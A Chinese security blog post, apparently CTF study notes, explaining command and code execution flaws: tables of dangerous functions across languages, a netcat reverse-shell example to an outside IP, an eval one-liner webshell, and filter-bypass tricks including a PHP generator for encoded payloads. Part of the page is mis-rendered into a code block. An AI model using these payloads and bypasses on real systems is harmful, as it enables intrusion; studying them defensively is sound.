@@ -1,0 +1,378 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>命令执行代码执行 | 胡萝卜的博客</title><meta name="author" content="car5ot"><meta name="copyright" content="car5ot"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命令执行对象：操作系统命令 攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的  危险的系统命令执行函数，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system() 输入的数据未被妥善隔离，而是被直接作为命令的一部分，拼接到待执行的命令字符串中 未对特殊字符（如管道符 |、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行代码执行">
+<meta property="og:url" content="https://justacarrot.github.io/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="胡萝卜的博客">
+<meta property="og:description" content="命令执行对象：操作系统命令 攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的  危险的系统命令执行函数，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system() 输入的数据未被妥善隔离，而是被直接作为命令的一部分，拼接到待执行的命令字符串中 未对特殊字符（如管道符 |、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://justacarrot.github.io/assets/cat.jpg">
+<meta property="article:published_time" content="2026-05-23T14:24:33.000Z">
+<meta property="article:modified_time" content="2026-05-23T14:37:56.395Z">
+<meta property="article:author" content="car5ot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://justacarrot.github.io/assets/cat.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "命令执行代码执行",
+  "url": "https://justacarrot.github.io/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/",
+  "image": "https://justacarrot.github.io/assets/cat.jpg",
+  "datePublished": "2026-05-23T14:24:33.000Z",
+  "dateModified": "2026-05-23T14:37:56.395Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "car5ot",
+      "url": "https://justacarrot.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://justacarrot.github.io/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '命令执行代码执行',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"></a><a class="nav-page-title" href="/"><span class="site-name">命令执行代码执行</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">命令执行代码执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-23T14:24:33.000Z" title="发表于 2026-05-23 22:24:33">2026-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-23T14:37:56.395Z" title="更新于 2026-05-23 22:37:56">2026-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>对象：操作系统命令</p>
+<p>攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的</p>
+<ol>
+<li><strong>危险的</strong>系统命令执行<strong>函数</strong>，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system()</li>
+<li><strong>输入的数据</strong>未被妥善隔离，而是被<strong>直接作为命令的一部分</strong>，<strong>拼接</strong>到待执行的命令字符串中</li>
+<li><strong>未对特殊字符</strong>（如管道符 |、分号 ;、命令分隔符）进行<strong>转义或过滤</strong>，导致恶意指令被成功注入</li>
+</ol>
+<h4 id="PHP-命令执行核心函数"><a href="#PHP-命令执行核心函数" class="headerlink" title="PHP 命令执行核心函数"></a>PHP 命令执行核心函数</h4><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险说明</th>
+<th align="center">典型利用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>system()</code></td>
+<td align="center">执行外部命令，并直接输出结果</td>
+<td align="center">直接执行系统命令，参数可控时可直接执行任意命令</td>
+<td align="center"><code>system($_GET[&#39;cmd&#39;]);</code> 直接 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>exec()</code></td>
+<td align="center">执行外部命令，返回结果最后一行</td>
+<td align="center">可通过第二个参数获取完整输出，参数可控即 RCE</td>
+<td align="center"><code>exec(&quot;ping &quot;.$_GET[&#39;ip&#39;]);</code> 命令拼接注入</td>
+</tr>
+<tr>
+<td align="center"><code>shell_exec()</code></td>
+<td align="center">执行外部命令，以字符串返回全部输出</td>
+<td align="center">等价于反引号 &#96;&#96;&#96;，参数可控直接 RCE</td>
+<td align="center"><code>$output = shell_exec(&quot;ls &quot;.$_GET[&#39;dir&#39;]);</code></td>
+</tr>
+<tr>
+<td align="center"><code>passthru()</code></td>
+<td align="center">执行外部命令，原样输出二进制结果</td>
+<td align="center">常用于执行带输出的命令（如反弹 shell），参数可控即 RCE</td>
+<td align="center"><code>passthru(&quot;nc -e /bin/sh 1.1.1.1 443&quot;);</code></td>
+</tr>
+<tr>
+<td align="center"><code>popen()</code></td>
+<td align="center">打开进程管道，执行命令并返回文件指针</td>
+<td align="center">可通过管道读写命令输出，参数可控即 RCE</td>
+<td align="center"><code>$handle = popen(&quot;id&quot;, &quot;r&quot;);</code></td>
+</tr>
+<tr>
+<td align="center"><code>proc_open()</code></td>
+<td align="center">执行命令并创建进程管道，支持更复杂的 IO 控制</td>
+<td align="center">功能极强，参数可控可实现任意命令执行、管道通信</td>
+<td align="center">复杂命令执行、无回显 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>pcntl_exec()</code></td>
+<td align="center">在当前进程空间执行指定程序</td>
+<td align="center">需 pcntl 扩展，参数可控可执行任意程序</td>
+<td align="center">Linux 环境下的命令执行</td>
+</tr>
+<tr>
+<td align="center">&#96;&#96;&#96;（反引号）</td>
+<td align="center">执行反引号内的系统命令，返回输出</td>
+<td align="center">语法糖（更简洁的写法），等价于<code>shell_exec()</code>，极易被忽略</td>
+<td align="center"><code>$output = </code>whoami<code>;</code></td>
+</tr>
+<tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">把字符串作为 PHP 代码执行</td>
+<td align="center"><strong>代码执行（非系统命令）</strong>，参数可控可执行任意 PHP 代码</td>
+<td align="center"><code>eval($_GET[&#39;code&#39;]);</code> 一句话木马</td>
+</tr>
+<tr>
+<td align="center"><code>assert()</code></td>
+<td align="center">检查断言是否为 FALSE，旧版本可执行代码</td>
+<td align="center">PHP &lt; 7.0 中<code>assert($str)</code>可执行代码，存在 RCE 风险</td>
+<td align="center">旧版本 PHP 的代码注入</td>
+</tr>
+<tr>
+<td align="center"><code>call_user_func()</code></td>
+<td align="center">调用第一个参数作为回调函数</td>
+<td align="center">若函数名 &#x2F; 参数可控，可调用任意危险函数（如<code>system</code>）</td>
+<td align="center"><code>call_user_func(&quot;system&quot;, &quot;id&quot;);</code></td>
+</tr>
+<tr>
+<td align="center"><code>array_map()</code></td>
+<td align="center">将自定义函数作用到数组每个元素</td>
+<td align="center">可传入危险函数（如<code>system</code>）实现批量命令执行</td>
+<td align="center"><code>array_map(&quot;system&quot;, array(&quot;id&quot;, &quot;whoami&quot;));</code></td>
+</tr>
+<tr>
+<td align="center"><code>preg_replace()</code></td>
+<td align="center">正则搜索替换</td>
+<td align="center">PHP &lt; 5.5 中使用<code>/e</code>修饰符时，会执行替换字符串中的 PHP 代码</td>
+<td align="center"><code>preg_replace(&quot;/test/e&quot;, $_GET[&#39;code&#39;], &quot;test&quot;);</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="Python-命令执行核心函数"><a href="#Python-命令执行核心函数" class="headerlink" title="Python 命令执行核心函数"></a>Python 命令执行核心函数</h4><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险说明</th>
+<th align="center">典型利用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>os.system()</code></td>
+<td align="center">执行系统命令，返回退出状态码</td>
+<td align="center">直接执行命令，无输出捕获，参数可控即 RCE</td>
+<td align="center"><code>os.system(&quot;whoami&quot;)</code></td>
+</tr>
+<tr>
+<td align="center"><code>os.popen()</code></td>
+<td align="center">执行命令并返回文件对象，可读取输出</td>
+<td align="center">可获取命令完整输出，参数可控即 RCE</td>
+<td align="center"><code>output = os.popen(&quot;id&quot;).read()</code></td>
+</tr>
+<tr>
+<td align="center"><code>subprocess.run()</code></td>
+<td align="center">推荐的子进程执行函数，支持复杂参数</td>
+<td align="center">功能极强，<code>shell=True</code>时参数可控可直接 RCE</td>
+<td align="center"><code>subprocess.run(&quot;id&quot;, shell=True)</code></td>
+</tr>
+<tr>
+<td align="center"><code>subprocess.Popen()</code></td>
+<td align="center">更底层的子进程创建函数，支持管道</td>
+<td align="center">可实现无回显 RCE、反弹 shell，参数可控即 RCE</td>
+<td align="center">复杂命令执行、提权</td>
+</tr>
+<tr>
+<td align="center"><code>commands.getstatusoutput()</code></td>
+<td align="center">执行命令，返回状态码 + 输出</td>
+<td align="center">Python 2 常用，等价于<code>os.popen</code>，参数可控即 RCE</td>
+<td align="center">Python 2 环境的命令执行</td>
+</tr>
+<tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">执行字符串形式的 Python 表达式</td>
+<td align="center">代码执行，参数可控可执行任意 Python 代码</td>
+<td align="center"><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;id&#39;)&quot;)</code></td>
+</tr>
+<tr>
+<td align="center"><code>exec()</code></td>
+<td align="center">执行动态生成的 Python 代码</td>
+<td align="center">功能比<code>eval</code>更强，可执行多行代码，参数可控即 RCE</td>
+<td align="center"><code>exec(&quot;import os; os.system(&#39;id&#39;)&quot;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="其他语言常见命令执行函数"><a href="#其他语言常见命令执行函数" class="headerlink" title="其他语言常见命令执行函数"></a>其他语言常见命令执行函数</h4><h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>Runtime.getRuntime().exec()</code></td>
+<td align="center">执行系统命令</td>
+<td align="center">直接 RCE，参数可控即可执行任意命令</td>
+</tr>
+<tr>
+<td align="center"><code>ProcessBuilder.start()</code></td>
+<td align="center">启动子进程执行命令</td>
+<td align="center">等价于<code>Runtime.exec()</code>，参数可控即 RCE</td>
+</tr>
+</tbody></table>
+<h5 id="C-C"><a href="#C-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h5><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>system()</code></td>
+<td align="center">执行系统命令</td>
+<td align="center">直接 RCE，参数可控即可执行任意命令</td>
+</tr>
+<tr>
+<td align="center"><code>popen()</code></td>
+<td align="center">执行命令并打开管道</td>
+<td align="center">可读写命令输出，参数可控即 RCE</td>
+</tr>
+</tbody></table>
+<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>child_process.exec()</code></td>
+<td align="center">执行系统命令，返回输出</td>
+<td align="center">参数可控直接 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>child_process.spawn()</code></td>
+<td align="center">启动子进程执行命令</td>
+<td align="center">支持管道，参数可控即 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">执行 JavaScript 代码</td>
+<td align="center">代码执行，可调用<code>child_process</code>实现 RCE</td>
+</tr>
+</tbody></table>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>对象：编程语言代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">**「任意代码执行 (Arbitrary Code Execution,ACE)」** 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。</span><br><span class="line">       在此基础上我们将通过网络触发任意代码执行的能力通常称为 **「远程代码执行 (RCE,Remote Code Execution,RCE)」**。</span><br><span class="line"></span><br><span class="line">程序错误地将不可信的用户输入当作“合法代码”执行，导致攻击者能够注入并运行恶意代码</span><br><span class="line"></span><br><span class="line">1. 存在可执行动态代码的**危险函数**，例如PHP的eval()、assert()或Python的exec()</span><br><span class="line">2. 用户的**输入数据**未被净化，直接进入了代码执行流程，**成为了执行代码的一部分**</span><br><span class="line">3. 程序**未对用户输入进行严格的检查、转义或过滤**，允许包含恶意代码的负载注入</span><br><span class="line"></span><br><span class="line">### 常见：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">|      函数名      |                       功能与安全风险说明                       |</span><br><span class="line">| :--------------: | :------------------------------------------------------------: |</span><br><span class="line">|     assert()     |  检查一个断言是否为 FALSE，旧版本中可执行代码，存在安全隐患。  |</span><br><span class="line">| call_user_func() |  把第一个参数作为回调函数调用，若参数可控则可能导致代码注入。  |</span><br><span class="line">|   array_map()   | 将用户自定义函数作用到数组中的每个值上，滥用可能导致批量执行。 |</span><br><span class="line">|  preg_replace()  |   执行正则表达式搜索和替换，当使用 /e 修饰符时允许代码执行。   |</span><br><span class="line"></span><br><span class="line">## RCE绕过</span><br><span class="line"></span><br><span class="line">#### 管道符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| 管道符 |  实例  |              描述              |</span><br><span class="line">| :----: | :----: | :----------------------------: |</span><br><span class="line">|  `;`  | `A;B` |    无论真假，A 与 B 都执行    |</span><br><span class="line">|  `&amp;`  | `A&amp;B` |    无论真假，A 与 B 都执行    |</span><br><span class="line">|  `&amp;&amp;`  | `A&amp;&amp;B` | A 为真时才执行 B，否则只执行 A |</span><br><span class="line">|   `   |   `   |               `A               |</span><br><span class="line">|   `   |        |               `               |</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">#### 空格过滤</span><br><span class="line"></span><br><span class="line">以下可代替空格</span><br><span class="line">&lt;       &lt;&gt;      %20(即space)      %09(即tab)	𝐼𝐹𝑆9	$&#123;IFS&#125;      $IFS      &#123;cat,/flag&#125;</span><br><span class="line"></span><br><span class="line">#### 反斜杠\绕过</span><br><span class="line"></span><br><span class="line">如cat、ls被过滤，使用\绕过</span><br><span class="line">`c\at`      `/flag`       `l\s`</span><br><span class="line"></span><br><span class="line">#### 取反绕过</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">//生成取反payload</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;// 要执行的函数名</span><br><span class="line">$b = &quot;cat /flag&quot;;// 要执行的命令</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);// 对字符串取反，再URL编码</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//输出得到的取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<pre><code>
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://justacarrot.github.io">car5ot</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://justacarrot.github.io/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">https://justacarrot.github.io/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://justacarrot.github.io" target="_blank">胡萝卜的博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/assets/cat.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传"><img class="cover" src="/assets/liti.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">文件上传</div></div><div class="info-2"><div class="info-item-1">绕过1. 前端限制绕过（JS 校验） 原理：仅用 JavaScript 在浏览器端检查文件后缀、大小等，服务器不校验或只依赖前端传来的结果。 具体操作： 禁用浏览器 JS：在浏览器设置或开发者工具中禁用 JavaScript，或用插件 NoScript。  直接发送，用 Burp Suite 抓包后修改后缀。  **修改 HTML&#x2F;JS：在开发者工具中直接修改 **allow_ext 变量或删除 checkFile() 调用。 123456789101112131415161718        &lt;script&gt;            function checkFile() &#123;/*方法一：改为function checkFile() &#123;                                            return true;  以直接放行                                            &#125;*/                var file = document.ge...</div></div></div></a><a class="pagination-related" href="/2026/05/23/Python%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" title="Python常见漏洞"><img class="cover" src="/assets/goodcat.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Python常见漏洞</div></div><div class="info-2"><div class="info-item-1">Python常见漏洞Python语法 仅列举与常见内容相关的基础语法     功能     1.导入模块 import os，防过滤：__import__(&#39;os&#39;)   2.字符串拼接，用来防过滤 &#39;cat&#39; + &#39; /flag&#39;   3.类与对象，找到能执行命令的类（SSTI) &#39;&#39;.__class__，&#39;&#39;.__base__，&#39;&#39;.__subclasses__()   4.字典{‘key’: ‘value’} {{config}}， {{self.__dict__}}   5.仅传字符串|         允许多行字符串和；不返回结果 eval()   6.读文件 open(&#39;/flag&#39;).read()   7.ping    8.魔术方法（反序列化） Python 里自带的、被反序列化时自动调用的代码逻辑：__xxx__魔术方法：系统自动调用的隐藏函数，反序列化动作的一环。反序列化漏洞：利用魔术方法自动执行命令   **1.**导入模块 os.popen() ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/assets/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">car5ot</div><div class="author-info-description">~~~///(^v^)\\\~~~</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">PHP 命令执行核心函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">Python 命令执行核心函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">其他语言常见命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Java"><span class="toc-number">1.3.1.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C-C"><span class="toc-number">1.3.2.</span> <span class="toc-text">C&#x2F;C++</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Node-js"><span class="toc-number">1.3.3.</span> <span class="toc-text">Node.js</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">代码执行</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传"><img src="/assets/liti.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传"/></a><div class="content"><a class="title" href="/2026/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><time datetime="2026-05-23T14:41:46.000Z" title="发表于 2026-05-23 22:41:46">2026-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="命令执行代码执行">命令执行代码执行</a><time datetime="2026-05-23T14:24:33.000Z" title="发表于 2026-05-23 22:24:33">2026-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/23/Python%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" title="Python常见漏洞"><img src="/assets/goodcat.jpg" 